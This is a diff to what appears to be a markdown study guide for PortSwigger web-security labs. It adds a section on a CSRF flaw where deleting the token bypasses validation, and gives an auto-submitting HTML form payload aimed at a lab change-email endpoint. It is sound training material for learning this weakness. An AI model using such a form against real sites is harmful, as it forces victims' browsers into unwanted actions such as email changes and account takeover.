@@ -1130,6 +1130,7 @@ very-long-strings-so-very-long-string-so-very-long-string-so-very-long-string-so
 [Referer Header Present](#referer-header-present)  
 [LastSearchTerm](#lastsearchterm)  
 [CSRF duplicated in cookie](#csrf-duplicated-in-cookie)  
+[CSRF Token Present](#csrf-token-present)  
 [Is Logged In](#is-logged-in)  
   
 >Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform. This can enable attacker to change victim email address and use password reset to take over the account.  
@@ -1211,7 +1212,7 @@ history.pushState('', '', '/');
 </html>
 ```  
 
-![csrf-referer-present.png](images/csrf-referer-present.png)  
+![csrf referer present](images/csrf-referer-present.png)  
 
 [PortSwigger Lab: CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)  
 
@@ -1279,6 +1280,25 @@ history.pushState('', '', '/');
 ![csrf duplicated cookie](images/csrf-duplicated-cookie.png)  
 
 [PortSwigger Lab: CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)  
+
+### CSRF Token Present  
+
+>Changing the value of the ```csrf``` parameter result in change email request being rejected. Deleting the CSRF token allow the change email accepted, and this ***identify*** that the validation of token being present vulnerable.
+
+>CSRF PoC Payload:  
+
+```html
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="$param1name" value="$param1value">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```  
+
+![csrf present validation fail](images/csrf-present-validation-fail.png)  
+
+[PortSwigger Lab: CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)  
 
 ### Is Logged In  
   
